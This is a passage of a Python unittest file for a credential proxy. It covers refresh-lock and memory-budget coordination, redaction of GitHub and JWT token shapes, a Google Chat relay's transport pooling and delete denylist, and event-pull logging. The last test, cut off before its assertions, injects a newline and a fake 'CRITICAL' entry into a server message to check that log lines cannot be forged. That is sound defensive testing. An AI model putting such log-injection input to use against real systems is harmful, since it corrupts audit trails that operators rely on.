        self.assertEqual(0, executor.reserved_bytes)
        return verb_results, route_results

    def test_a_route_holder_waiting_for_the_budget_yields_the_lock_to_a_vcs_verb_and_coalesces(self):
        verb_results, route_results = self._convoy()
        self.assertEqual(["ok"], verb_results)
        self.assertEqual(["ok"], route_results)

    def test_a_route_caller_that_yields_after_its_arrival_bound_still_coalesces(self):
        # The route caller spends most of its arrival bound waiting for the
        # lock, then parks in the budget wait on that wait's own clock, and
        # yields to the vcs verb only after the arrival bound has passed. Its
        # wait for the verb is bounded from the yield, so it coalesces.
        bound = 2.0
        executor = self._budgeted_executor(admits=1)
        entered = threading.Event()
        finish = threading.Event()
        self.addCleanup(finish.set)
        calls = []

        def blocking_helper(*args, **kwargs):
            calls.append(threading.current_thread().name)
            entered.set()
            finish.wait(5)
            return subprocess.CompletedProcess([], 0, "", "")

        held = threading.Event()
        go = threading.Event()
        self.addCleanup(go.set)
        verb_results = []

        def vcs_verb():
            try:
                with executor.request_slot():
                    held.set()
                    go.wait(10)
                    executor.refresh_forge_credential("github", "gke-agentic/infra")
                verb_results.append("ok")
            except Exception as exc:  # surfaced by the assertions
                verb_results.append(exc)

        with mock.patch.object(executor, "_run_forge_helper", blocking_helper), \
             mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", bound):
            verb = threading.Thread(target=vcs_verb, name="verb", daemon=True)
            verb.start()
            self.assertTrue(held.wait(5))
            executor._refresh_lock.acquire()
            started = time.monotonic()
            route_results = []
            route = self._refresh_in_thread(executor, route_results)
            # Margins, one-directional: the lock is released inside the
            # route caller's arrival bound, and the verb arrives after it.
            time.sleep(0.75 * bound)
            executor._refresh_lock.release()
            self._wait_until(lambda: executor.queued_requests > 0)
            time.sleep(max(0.0, started + 1.25 * bound - time.monotonic()))
            self.assertTrue(route.is_alive())
            go.set()
            self.assertTrue(entered.wait(5))
            finish.set()
            verb.join(5)
            route.join(5)
            self.assertFalse(verb.is_alive() or route.is_alive())
        self.assertEqual(["ok"], verb_results)
        self.assertEqual(["ok"], route_results)
        self.assertEqual(["verb"], calls)
        self.assertEqual(0, executor.reserved_bytes)

    def _refused_waiting_for_covered_refreshers(self, yielded):
        executor = self._budgeted_executor(admits=1)
        with executor._slot_condition:
            executor._covered_refresh_waiters = 1
        queued_at = time.monotonic() - credential_proxy.COMMAND_SLOT_WAIT_SECONDS - 1
        with self.assertRaises(credential_proxy.CommandSlotUnavailable) as refused:
            executor._await_covered_refreshers(
                "github",
                queued_at + credential_proxy.COMMAND_SLOT_WAIT_SECONDS,
                None,
                yielded_since=queued_at if yielded else None,
            )
        return str(refused.exception)

    def test_a_route_caller_refused_after_yielding_says_so_with_the_time_it_spent(self):
        text = self._refused_waiting_for_covered_refreshers(yielded=True)
        self.assertIn("stepped aside", text)
        self.assertNotIn("for another refresh to finish", text)
        seconds = int(re.search(r"waited (\d+)s", text).group(1))
        self.assertGreaterEqual(seconds, 60)

    def test_a_route_caller_refused_before_yielding_keeps_the_lock_wait_text(self):
        text = self._refused_waiting_for_covered_refreshers(yielded=False)
        self.assertEqual(
            "a github credential refresh waited 60s for another refresh to finish; retry shortly",
            text,
        )

    def test_a_route_holder_that_yielded_raises_the_vcs_verbs_recorded_failure(self):
        verb_results, route_results = self._convoy(outcome=RuntimeError("Minty unavailable"))
        self.assertIsInstance(verb_results[0], RuntimeError)
        self.assertIs(verb_results[0], route_results[0])

    def test_a_slot_less_reserver_asked_to_yield_leaves_no_ticket_and_no_reservation(self):
        executor = self._budgeted_executor(admits=1)
        self._hold_the_budget(executor)
        held = executor.reserved_bytes
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 120):
            with self.assertRaises(credential_proxy.AdmissionYielded):
                with executor._admit(takes_slot=False, caller=None, yield_when=lambda: True):
                    self.fail("admitted")
        self.assertEqual(0, executor.queued_requests)
        self.assertEqual(held, executor.reserved_bytes)

    def test_an_admission_given_a_deadline_is_refused_at_it_not_at_the_wait_bound(self):
        executor = self._budgeted_executor(admits=1)
        self._hold_the_budget(executor)
        held = executor.reserved_bytes
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 120):
            started = time.monotonic()
            with self.assertRaises(credential_proxy.CommandSlotUnavailable) as refused:
                with executor._admit(takes_slot=False, caller=None, deadline=started + 0.3):
                    self.fail("admitted")
            self.assertLess(time.monotonic() - started, 5)
        self.assertIn("without fitting", str(refused.exception))
        self.assertEqual(0, executor.queued_requests)
        self.assertEqual(held, executor.reserved_bytes)

    def _yield_to_a_verb_of_another_org(self, executor, calls):
        """Start a vcs verb holding the only admission and a route caller
        parked in its budget wait with the lock held; the verb then refreshes
        another org's repository, so the route caller yields to it and its
        re-check stays stale. The helper stub answers the scoped set as the
        repository it was given. Returns (route thread, route results, verb
        results, leave event); the verb holds its admission until `leave`."""
        verb_started = threading.Event()

        def helper(provider, helper_path, arguments, action, log_success=False):
            name = threading.current_thread().name
            calls.append(name)
            if name == "verb":
                verb_started.set()
            return subprocess.CompletedProcess([], 0, arguments[0] + "\n", "")

        patch = mock.patch.object(executor, "_run_forge_helper", helper)
        patch.start()
        self.addCleanup(patch.stop)
        held = threading.Event()
        go = threading.Event()
        leave = threading.Event()
        threads = []
        # Joined after the events below are set, so cleanup does not wait out
        # the verb's own timeout.
        self.addCleanup(lambda: [thread.join(10) for thread in threads])
        self.addCleanup(go.set)
        self.addCleanup(leave.set)
        verb_results = []

        def vcs_verb():
            try:
                with executor.request_slot():
                    held.set()
                    go.wait(10)
                    executor.refresh_forge_credential("github", "other-org/infra")
                    verb_results.append("ok")
                    leave.wait(10)
            except Exception as exc:  # surfaced by the assertions
                verb_results.append(exc)

        route_results = []

        def route_caller():
            try:
                executor.refresh_forge_credential("github", "gke-agentic/infra")
                route_results.append("ok")
            except Exception as exc:  # surfaced by the assertions
                route_results.append(exc)

        verb = threading.Thread(target=vcs_verb, name="verb", daemon=True)
        threads.append(verb)
        verb.start()
        self.assertTrue(held.wait(5))
        route = threading.Thread(target=route_caller, name="route", daemon=True)
        threads.append(route)
        route.start()
        self._wait_until(lambda: executor.queued_requests > 0)
        self.assertTrue(executor._refresh_lock.locked())
        go.set()
        self.assertTrue(verb_started.wait(5))
        return route, route_results, verb_results, leave

    def test_a_route_caller_still_stale_after_its_yield_gives_the_lock_up_to_a_verb_that_holds_the_budget(self):
        # After its one yield the route caller re-takes the lock and waits for
        # the budget again. A second vcs verb, admitted meanwhile and so
        # holding the budget it waits for, needs that lock: the route caller
        # gives it up at once, told it stepped aside, rather than holding it
        # to the yield bound against the verb.
        executor = self._budgeted_executor(admits=2)
        calls = []
        helper_gate = threading.Event()
        verb_started = threading.Event()

        def helper(provider, helper_path, arguments, action, log_success=False):
            name = threading.current_thread().name
            calls.append(name)
            if name == "verb":
                verb_started.set()
                helper_gate.wait(10)
            return subprocess.CompletedProcess([], 0, arguments[0] + "\n", "")

        patch = mock.patch.object(executor, "_run_forge_helper", helper)
        patch.start()
        self.addCleanup(patch.stop)
        events = {name: threading.Event() for name in (
            "exec_held", "exec_leave", "verb_held", "verb_go", "verb_leave",
            "second_held", "second_go", "second_leave",
        )}
        threads = []
        self.addCleanup(lambda: [thread.join(10) for thread in threads])
        for name in ("exec_leave", "verb_go", "verb_leave", "second_go", "second_leave"):
            self.addCleanup(events[name].set)
        self.addCleanup(helper_gate.set)
        results = {"verb": [], "route": [], "second": []}

        def exec_holder():
            with executor.request_slot():
                events["exec_held"].set()
                events["exec_leave"].wait(10)

        def vcs_verb(name, repository, go, leave):
            def run():
                try:
                    with executor.request_slot():
                        events[name + "_held"].set()
                        go.wait(10)
                        executor.refresh_forge_credential("github", repository)
                        results[name].append("ok")
                        leave.wait(10)
                except Exception as exc:  # surfaced by the assertions
                    results[name].append(exc)
            return run

        def route_caller():
            try:
                executor.refresh_forge_credential("github", "gke-agentic/infra")
                results["route"].append("ok")
            except Exception as exc:  # surfaced by the assertions
                results["route"].append(exc)

        def start(name, target):
            thread = threading.Thread(target=target, name=name, daemon=True)
            threads.append(thread)
            thread.start()
            return thread

        # Long, so nobody gets out by timing out.
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 120):
            start("exec", exec_holder)
            self.assertTrue(events["exec_held"].wait(5))
            start("verb", vcs_verb("verb", "other-org/infra", events["verb_go"], events["verb_leave"]))
            self.assertTrue(events["verb_held"].wait(5))
            # Both admissions held: the route caller takes the free lock and
            # parks in its budget wait.
            route = start("route", route_caller)
            self._wait_until(lambda: executor.queued_requests > 0)
            self.assertTrue(executor._refresh_lock.locked())
            # The first verb needs a refresh: the route caller yields, the
            # verb's helper starts and is held open.
            events["verb_go"].set()
            self.assertTrue(verb_started.wait(5))
            # While the route caller is out of the admission queue (waiting
            # to re-take the lock), the exec leaves and a second verb takes
            # its admission: the budget is full again, held by the two verbs.
            second = start("second", vcs_verb("second", "third-org/infra", events["second_go"], events["second_leave"]))
            events["exec_leave"].set()
            self.assertTrue(events["second_held"].wait(5))
            # The first verb's helper finishes (another org's token), and the
            # route caller, the only waiter, re-takes the lock and reserves
            # again: still stale, budget full, so it parks with the lock held.
            helper_gate.set()
            self._wait_until(lambda: results["verb"] == ["ok"])
            self._wait_until(lambda: executor.queued_requests > 0 and executor._refresh_lock.locked())
            self.assertEqual(["verb"], calls)
            # The second verb now needs a refresh and counts itself: the route
            # caller steps aside for good and the verb runs its helper under
            # the budget it already holds, well inside the route caller's
            # yield bound.
            events["second_go"].set()
            self._wait_until(lambda: results["second"] == ["ok"])
            route.join(5)
            self.assertFalse(route.is_alive())
            events["verb_leave"].set()
            events["second_leave"].set()
        self.assertEqual(["verb", "second"], calls)
        self.assertEqual(1, len(results["route"]))
        refusal = results["route"][0]
        self.assertIsInstance(refusal, credential_proxy.CommandSlotUnavailable)
        self.assertIn("stepped aside", str(refusal))
        self.assertIn("child memory budget", str(refusal))
        self.assertNotIn("without fitting", str(refusal))
        self.assertEqual(0, executor._covered_refresh_waiters)
        self.assertFalse(executor._refresh_lock.locked())

    def test_a_route_caller_still_stale_after_its_yield_reserves_on_the_yield_bound_without_yielding(self):
        # Structural, not timed: the reservation after the yield is handed the
        # deadline the wait for the verb and the re-take ran on, and still
        # watches the covered count (a verb counting itself ends the attempt,
        # the test above); the budget stays held, so that wait is refused.
        executor = self._budgeted_executor(admits=1)
        calls = []
        reservations = []
        real_reserve = executor.reserve_child_memory

        def spy_reserve(caller=None, yield_when=None, deadline=None, queued_at=None):
            reservations.append({"yield_when": yield_when, "deadline": deadline, "queued_at": queued_at})
            return real_reserve(
                caller=caller, yield_when=yield_when, deadline=deadline, queued_at=queued_at
            )

        yield_deadlines = []
        real_await = executor._await_covered_refreshers

        def spy_await(provider, deadline, caller, **kwargs):
            yield_deadlines.append(deadline)
            return real_await(provider, deadline, caller, **kwargs)

        with mock.patch.object(executor, "reserve_child_memory", spy_reserve), \
             mock.patch.object(executor, "_await_covered_refreshers", spy_await), \
             mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 2.0):
            route, route_results, _, _ = self._yield_to_a_verb_of_another_org(executor, calls)
            route.join(10)
            self.assertFalse(route.is_alive())
        self.assertEqual(2, len(reservations))
        self.assertIsNone(reservations[0]["deadline"])
        self.assertIsNotNone(reservations[0]["yield_when"])
        self.assertEqual(1, len(yield_deadlines))
        self.assertEqual(yield_deadlines[0], reservations[1]["deadline"])
        self.assertIsNotNone(reservations[1]["yield_when"])
        # The second leg is handed the first's arrival, so the one admission
        # is observed from it; the first measures its own.
        self.assertIsNone(reservations[0]["queued_at"])
        self.assertIsNotNone(reservations[1]["queued_at"])
        self.assertLessEqual(reservations[1]["queued_at"], reservations[1]["deadline"])
        self.assertIsInstance(route_results[0], credential_proxy.CommandSlotUnavailable)
        # Reworded for the leg it ran on: stepped aside, with the budget's
        # figures, never `_admit`'s text naming the full wait bound.
        refusal = str(route_results[0])
        self.assertIn("stepped aside for; the child memory budget is ", refusal)
        self.assertRegex(refusal, r"\d+ MiB in use of \d+ MiB: \d+ MiB reserved for children")
        self.assertNotIn("without fitting", refusal)
        self.assertNotIn("waited 2.0s", refusal)
        self.assertNotIn("waited 60s", refusal)
        self.assertEqual(["verb"], calls)

    def test_a_route_refresher_gives_up_on_a_held_refresh_lock_at_the_bound(self):
        # Whoever holds the lock -- here, another provider's helper -- the
        # route's wait for it is bounded like admission.
        executor = self._budgeted_executor(admits=2)
        executor._refresh_lock.acquire()
        self.addCleanup(executor._refresh_lock.release)
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.3):
            with self.assertRaises(credential_proxy.CommandSlotUnavailable) as refused:
                executor.refresh_forge_credential("github", "gke-agentic/infra")
        self.assertIn("for another refresh to finish", str(refused.exception))
        self.assertEqual(0, executor.reserved_bytes)

    def test_with_the_budget_off_a_route_refresher_behind_a_running_helper_is_refused_at_the_bound(self):
        executor = self._budgeted_executor(admits=2)
        executor.children_budget_bytes = None
        results = []
        first, finish, calls = self._start_blocking_refresh(executor, results)
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.3):
            with self.assertRaises(credential_proxy.CommandSlotUnavailable) as refused:
                executor.refresh_forge_credential("github", "gke-agentic/infra")
        self.assertEqual(
            "a github credential refresh waited 0.3s for another refresh to finish; retry shortly",
            str(refused.exception),
        )
        finish.set()
        first.join(5)
        self.assertEqual(["ok"], results)
        self.assertEqual(1, len(calls))

    def test_a_refresher_that_hangs_up_waiting_for_the_lock_raises_and_reserves_nothing(self):
        executor = self._budgeted_executor(admits=2)
        results = []
        first, finish, calls = self._start_blocking_refresh(executor, results)
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)
        second_results = []
        second = self._refresh_in_thread(executor, second_results, caller=ours)
        time.sleep(2 * credential_proxy.COMMAND_SLOT_POLL_SECONDS)
        theirs.close()
        second.join(5)
        self.assertFalse(second.is_alive())
        self.assertIsInstance(second_results[0], credential_proxy.CallerHungUp)
        self.assertEqual(
            "the caller disconnected while waiting for the refresh lock",
            str(second_results[0]),
        )
        self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
        finish.set()
        first.join(5)
        self.assertEqual(["ok"], results)
        self.assertEqual(1, len(calls))
        self.assertEqual(0, executor.reserved_bytes)


class ForgeRefreshRouteTest(unittest.TestCase):
    """What `POST /v1/forge/refresh` answers, and what it declines to say."""

    def _post(self, body, connection=None, **executor):
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        if connection is not None:
            handler.connection = connection
        handler.max_request_bytes = 10 * 1024 * 1024
        encoded = json.dumps(body).encode()
        handler.headers = {"Content-Length": str(len(encoded))}
        handler.rfile = io.BytesIO(encoded)
        handler.executor = types.SimpleNamespace(**executor)
        replies = []
        handler._json = lambda status, payload: replies.append((status, payload))
        handler.log_message = lambda *args: None
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            handler._handle_forge_refresh()
        return replies

    def test_a_refreshed_credential_names_the_forge_that_holds_it(self):
        calls = []
        replies = self._post(
            {"repository": "gke-agentic/infra"},
            refresh_forge_credential=lambda provider, repository, caller=None: calls.append(
                (provider, repository)
            ),
        )

        self.assertEqual(calls, [("github", "gke-agentic/infra")])
        self.assertEqual(
            replies, [(HTTPStatus.OK, {"status": "refreshed", "forge": "github"})]
        )

    def test_a_failure_answers_a_reason_code_and_no_detail(self):
        refusal = "Minty returned error (HTTP 403): installation not found"

        def fail(provider, repository, caller=None):
            raise RuntimeError(refusal)

        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            replies = self._post(
                {"repository": "gke-agentic/infra"}, refresh_forge_credential=fail
            )

        status, payload = replies[0]
        self.assertEqual(status, HTTPStatus.BAD_GATEWAY)
        self.assertEqual(payload["code"], "FORGE_TOKEN_REFRESH_FAILED")
        self.assertNotIn(refusal, json.dumps(payload))

    def test_a_host_this_install_serves_no_credential_for_is_refused(self):
        replies = self._post(
            {"repository": "https://git.example.invalid/acme/infra"},
            refresh_forge_credential=lambda provider, repository, caller=None: self.fail(
                "refreshed a credential for an unknown host"
            ),
        )

        self.assertNotEqual(replies[0][0], HTTPStatus.OK)

    def test_the_route_hands_its_connection_to_the_refresh(self):
        # Review focus 5: the caller is passed so a hang-up while queued for
        # the budget is noticed; a stub without the keyword would be a
        # TypeError the generic branch reads as a 502.
        seen = {}

        def record(provider, repository, caller=None):
            seen["caller"] = caller

        handler_connection = object()
        replies = self._post(
            {"repository": "gke-agentic/infra"}, refresh_forge_credential=record,
            connection=handler_connection,
        )
        self.assertIs(handler_connection, seen["caller"])
        self.assertEqual(HTTPStatus.OK, replies[0][0])

    def test_a_refresh_refused_by_the_budget_answers_the_busy_503(self):
        def busy(provider, repository, caller=None):
            raise credential_proxy.CommandSlotUnavailable(
                "the credential proxy is at its child memory budget (128 MiB in use of 704 MiB: "
                "128 MiB reserved for children, 0 MiB of output allowance for 0 requests)"
            )

        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            replies = self._post({"repository": "gke-agentic/infra"}, refresh_forge_credential=busy)
        status, payload = replies[0]
        self.assertEqual(HTTPStatus.SERVICE_UNAVAILABLE, status)
        self.assertEqual("CREDENTIAL_PROXY_BUSY", payload["code"])
        self.assertIn("child memory budget", payload["error"])
        # The log line carries the refusal, so it says what held the refresh.
        self.assertTrue(
            any(
                "credential refresh queued too long: the credential proxy is at its child memory budget"
                in line
                for line in logs.output
            ),
            logs.output,
        )

    def test_a_caller_that_hangs_up_while_queued_gets_no_response(self):
        why = "the caller disconnected while waiting for the refresh lock"

        def gone(provider, repository, caller=None):
            raise credential_proxy.CallerHungUp(why)

        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            replies = self._post({"repository": "gke-agentic/infra"}, refresh_forge_credential=gone)
        self.assertEqual([], replies)
        self.assertTrue(any("abandoned: " + why in line for line in logs.output), logs.output)


class RedactCredentialsTest(unittest.TestCase):
    def test_redacts_github_and_jwt_shapes(self):
        for secret in (
            "ghs_" + "a" * 36,
            "ghp_" + "b" * 36,
            "github_pat_" + "c" * 30,
            "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZ2VudCJ9.c2lnbmF0dXJlX2hlcmU",
        ):
            with self.subTest(secret=secret):
                self.assertEqual(
                    credential_proxy.redact_credentials(f"before {secret} after"),
                    "before [REDACTED] after",
                )

    def test_leaves_ordinary_diagnostics_alone(self):
        message = "Minty returned error (HTTP 403): installation not found"
        self.assertEqual(credential_proxy.redact_credentials(message), message)


class GoogleChatRelayTest(unittest.TestCase):
    class FakeRequest:
        def __init__(self, response, hook=None):
            self.response = response
            self.hook = hook

        def execute(self, http=None, num_retries=0):
            # Signature matches googleapiclient's HttpRequest.execute. A call
            # made without ``http`` would share the discovery resource's single
            # httplib2 transport across threads, and one without ``num_retries``
            # gets a single attempt, so both are part of what is under test.
            if self.hook is not None:
                self.hook(http, num_retries)
            return self.response

    class FakeResource:
        def __init__(self, calls, path=(), hook=None):
            self.calls = calls
            self.path = path
            self.hook = hook

        def __getattr__(self, name):
            def invoke(**arguments):
                if not arguments:
                    return GoogleChatRelayTest.FakeResource(
                        self.calls, (*self.path, name), self.hook
                    )
                self.calls.append((self.path, name, arguments))
                return GoogleChatRelayTest.FakeRequest(
                    {"path": self.path, "method": name, "arguments": arguments},
                    self.hook,
                )

            return invoke

    def relay(self, hook=None, pool_size=8, num_retries=3):
        """A relay wired to fake transports, standing in for __init__.

        ``_build_http`` hands out a distinguishable token per call so a test
        can tell one transport from another, and counts how many were built.
        """
        relay = GoogleChatRelay.__new__(GoogleChatRelay)
        relay.calls = []
        relay.chat = self.FakeResource(relay.calls, hook=hook)
        relay._http_pool = queue.LifoQueue()
        relay._http_pool_size = pool_size
        relay.num_retries = num_retries
        relay.built = []

        def build_http():
            transport = f"http-{len(relay.built)}"
            relay.built.append(transport)
            return transport

        relay._build_http = build_http
        return relay

    def send(self, relay):
        return relay.api_call(["spaces", "messages"], "create", {"body": {}})

    def concurrently(self, relay, count):
        """Run ``count`` api_calls at once, all held open by the hook."""
        threads = [
            threading.Thread(target=self.send, args=(relay,)) for _ in range(count)
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(timeout=10)
            self.assertFalse(thread.is_alive(), "api_call thread did not finish")

    def test_forwards_unknown_resource_method_and_body_unchanged(self):
        relay = self.relay()
        arguments = {"body": {"futureSchema": {"nested": [1, 2, 3]}}}

        result = relay.api_call(
            ["futureResource", "messages"], "futureMethod", arguments
        )

        self.assertEqual(
            [(("futureResource", "messages"), "futureMethod", arguments)], relay.calls
        )
        self.assertEqual(arguments, result["arguments"])

    def test_a_destructive_method_is_refused_before_it_reaches_the_api(self):
        """The relay forwards any method by name, so deletion needs its own gate.

        A denylist rather than a read-only allowlist: the resource tree belongs
        to the Hermes adapter and the Chat discovery document, neither of them
        in this repository, so an allowlist that missed a resource would be
        chat down while a denylist that misses one is a call that still works.
        """
        relay = self.relay()
        for method in ("delete", "Delete", "batchDelete"):
            with self.subTest(method=method):
                with self.assertRaises(ValueError):
                    relay.api_call(["spaces", "messages"], method, {"name": "spaces/x"})
        self.assertEqual([], relay.calls)

    def test_a_read_or_write_method_still_passes(self):
        relay = self.relay()
        for method in ("create", "get", "list", "patch"):
            with self.subTest(method=method):
                relay.api_call(["spaces", "messages"], method, {"body": {}})
        self.assertEqual(4, len(relay.calls))

    def test_the_call_carries_a_transport_and_the_retry_budget(self):
        seen = []
        relay = self.relay(
            hook=lambda http, num_retries: seen.append((http, num_retries))
        )

        self.send(relay)

        self.assertEqual([("http-0", 3)], seen)

    def test_concurrent_calls_do_not_share_a_transport(self):
        """The bug: one httplib2 socket shared by two threads raises SSLError.

        Both calls are held inside execute until the other arrives, so they are
        genuinely in flight together — which is the only condition under which
        a shared transport corrupts.
        """
        both_in_flight = threading.Barrier(2, timeout=10)
        seen = []

        def hook(http, _num_retries):
            seen.append(http)
            both_in_flight.wait()

        relay = self.relay(hook=hook)

        self.concurrently(relay, 2)

        self.assertEqual(2, len(seen))
        self.assertEqual(2, len(set(seen)))

    def test_sequential_calls_reuse_a_transport(self):
        """Reuse is the point of pooling rather than building per call.

        A fresh transport per call means a fresh TLS handshake to
        chat.googleapis.com for every message the agent sends.
        """
        seen = []
        relay = self.relay(hook=lambda http, _n: seen.append(http))

        self.send(relay)
        self.send(relay)

        self.assertEqual(["http-0", "http-0"], seen)
        self.assertEqual(1, len(relay.built))

    def test_a_failed_call_retires_its_transport(self):
        """A socket that failed mid-record must not be lent out again.

        Returning it would turn one transport fault into a fault on every
        call that follows.
        """
        seen = []

        def hook(http, _num_retries):
            seen.append(http)
            if len(seen) == 1:
                raise RuntimeError("record layer failure")

        relay = self.relay(hook=hook)

        with self.assertRaises(RuntimeError):
            self.send(relay)
        self.send(relay)

        self.assertEqual(["http-0", "http-1"], seen)
        self.assertEqual(1, relay._http_pool.qsize())

    def test_the_pool_does_not_grow_past_its_bound(self):
        all_in_flight = threading.Barrier(4, timeout=10)
        relay = self.relay(hook=lambda _http, _n: all_in_flight.wait(), pool_size=2)

        self.concurrently(relay, 4)

        self.assertEqual(4, len(relay.built))
        self.assertEqual(2, relay._http_pool.qsize())

    def test_error_fields_name_the_status_and_nothing_else(self):
        rejection = Exception("<HttpError 404 when requesting https://chat...>")
        rejection.resp = types.SimpleNamespace(status=404, reason="Not Found")

        self.assertEqual(
            {"status": 404, "reason": "Not Found"}, _chat_error_fields(rejection)
        )
        self.assertIsNone(_chat_error_fields(RuntimeError("connection reset")))

    def _chat_api_post(self, api_call):
        """Drive the relay's POST handler with an api_call of our choosing."""
        relay = self.relay()
        relay.api_call = api_call
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.chat_relay = relay
        handler.max_request_bytes = 1024
        handler.path = "/v1/chat/api"
        handler._read_json_body = lambda: {
            "resource": ["spaces", "messages"],
            "method": "create",
            "arguments": {},
        }
        captured = {}
        handler._json = lambda status, payload: captured.update(
            status=status, payload=payload
        )
        with self.assertLogs("credential-proxy", level="WARNING") as logs:
            handler._handle_chat_post()
        captured["logs"] = logs.output
        return captured

    def test_a_rejected_call_tells_the_agent_the_status(self):
        """A 404 for an unknown space must not read like a transport blip.

        api_call already retries everything transient, so a failure reaching
        the handler is usually Google refusing the request — and the agent
        cannot tell which unless the status crosses back.
        """

        def rejected(*_args, **_kwargs):
            exc = Exception(
                "<HttpError 404 when requesting "
                "https://chat.googleapis.com/v1/spaces/AAAA/messages?alt=json>"
            )
            exc.resp = types.SimpleNamespace(status=404, reason="Not Found")
            raise exc

        captured = self._chat_api_post(rejected)

        self.assertEqual(HTTPStatus.BAD_GATEWAY, captured["status"])
        self.assertEqual(
            {
                "error": "Google Chat operation failed",
                "chat": {"status": 404, "reason": "Not Found"},
            },
            captured["payload"],
        )
        # The URI in an HttpError names the space and the credentialed query.
        self.assertNotIn("chat.googleapis.com", json.dumps(captured["payload"]))
        self.assertNotIn("chat.googleapis.com", "\n".join(captured["logs"]))

    def test_a_transport_failure_carries_no_chat_object(self):
        def broken(*_args, **_kwargs):
            raise RuntimeError("record layer failure")

        captured = self._chat_api_post(broken)

        self.assertEqual(HTTPStatus.BAD_GATEWAY, captured["status"])
        self.assertEqual(
            {"error": "Google Chat operation failed"}, captured["payload"]
        )
        self.assertIn("type=RuntimeError status=none", "\n".join(captured["logs"]))


class ChatEventPullLegibilityTest(unittest.TestCase):
    """A Chat event pull says which subscription it reads and what refused it.

    gke-labs/kube-agents#2404: a refused pull logged only its exception class,
    and an empty one said nothing, so an install whose events never arrive
    looked the same as a quiet one.
    """

    SUBSCRIPTION = "projects/kagents-dev/subscriptions/a2a-chat-sub"
    # Stands in for the relay's own credential; it must never reach a log line.
    CREDENTIAL_MARKER = "ya29.credential-that-must-not-be-logged"

    class PermissionDenied(Exception):
        """The attributes google.api_core's PermissionDenied carries."""

        def __init__(self, message, reason=None, metadata=None):
            super().__init__(f"403 {message} [details with {ChatEventPullLegibilityTest.CREDENTIAL_MARKER}]")
            self.code = HTTPStatus.FORBIDDEN
            self.message = message
            self.reason = reason
            self.metadata = metadata

    def relay(self, pull):
        relay = types.SimpleNamespace(
            subscription_path=self.SUBSCRIPTION,
            _credentials=types.SimpleNamespace(token=self.CREDENTIAL_MARKER),
        )
        relay.pull = pull
        return relay

    def get(self, path, relay):
        """Drive do_GET on one relay route, returning status, payload and logs."""
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.path = path
        handler.a2a_chat_relay = relay
        handler.chat_relay = relay
        handler._authenticated = lambda: object()
        captured = {}
        handler._json = lambda status, payload: captured.update(
            status=status, payload=payload
        )
        with self.assertLogs("credential-proxy", level="DEBUG") as logs:
            # assertLogs fails on silence; a marker keeps an empty pull legal.
            credential_proxy.LOGGER.debug("marker")
            handler.do_GET()
        captured["logs"] = [line for line in logs.output if not line.endswith("marker")]
        return captured

    def refuse(self, exc):
        def pull():
            raise exc

        return self.relay(pull)

    def test_an_empty_pull_names_the_subscription_to_the_gateway(self):
        captured = self.get("/v1/chat/a2a/events", self.relay(lambda: None))

        self.assertEqual(HTTPStatus.OK, captured["status"])
        self.assertEqual(
            {"event": None, "subscription": self.SUBSCRIPTION}, captured["payload"]
        )

    def test_a_refused_pull_logs_the_subscription_and_the_refused_permission(self):
        exc = self.PermissionDenied(
            "User not authorized to perform this action.",
            reason="IAM_PERMISSION_DENIED",
            metadata={"permission": "pubsub.subscriptions.consume", "resource": self.SUBSCRIPTION},
        )

        captured = self.get("/v1/chat/a2a/events", self.refuse(exc))

        self.assertEqual(1, len(captured["logs"]), captured["logs"])
        line = captured["logs"][0]
        self.assertIn("a2a chat event pull failed", line)
        self.assertIn(f"subscription={self.SUBSCRIPTION}", line)
        self.assertIn("type=PermissionDenied", line)
        self.assertIn("code=403", line)
        self.assertIn("reason=IAM_PERMISSION_DENIED", line)
        self.assertIn("permission=pubsub.subscriptions.consume message=", line)
        self.assertIn("message=User not authorized to perform this action.", line)
        self.assertNotIn(self.CREDENTIAL_MARKER, line)
        self.assertEqual(HTTPStatus.SERVICE_UNAVAILABLE, captured["status"])
        self.assertEqual(
            {
                "error": "a2a chat event pull failed",
                "subscription": self.SUBSCRIPTION,
                "pubsub": {"type": "PermissionDenied", "code": 403},
            },
            captured["payload"],
        )
        self.assertNotIn(self.CREDENTIAL_MARKER, json.dumps(captured["payload"]))

    def test_a_refusal_without_error_info_names_the_permission_a_pull_needs(self):
        captured = self.get(
            "/v1/chat/a2a/events", self.refuse(self.PermissionDenied("User not authorized."))
        )

        self.assertIn(
            "permission=pubsub.subscriptions.consume (what a pull needs; the error named none)",
            captured["logs"][0],
        )

    def test_a_transport_fault_names_its_type_and_no_permission(self):
        captured = self.get(
            "/v1/chat/a2a/events", self.refuse(ConnectionResetError("reset by peer"))
        )

        line = captured["logs"][0]
        self.assertIn(f"subscription={self.SUBSCRIPTION}", line)
        self.assertIn("type=ConnectionResetError", line)
        self.assertNotIn("permission=", line)
        self.assertEqual(
            {"type": "ConnectionResetError"}, captured["payload"]["pubsub"]
        )

    def test_a_retry_that_ran_out_names_what_it_gave_up_on(self):
        class RetryError(Exception):
            def __init__(self, message, cause):
                super().__init__(message)
                self.message = message
                self.cause = cause

        exc = RetryError("Timeout of 20.0s exceeded", ConnectionResetError("reset"))

        captured = self.get("/v1/chat/a2a/events", self.refuse(exc))

        line = captured["logs"][0]
        self.assertIn("type=RetryError", line)
        self.assertIn("cause=ConnectionResetError", line)

    def test_a_server_message_cannot_forge_a_log_line(self):
        exc = self.PermissionDenied("refused\nCRITICAL forged line " + "x" * 500)

        captured = self.get("/v1/chat/a2a/events", self.refuse(exc))

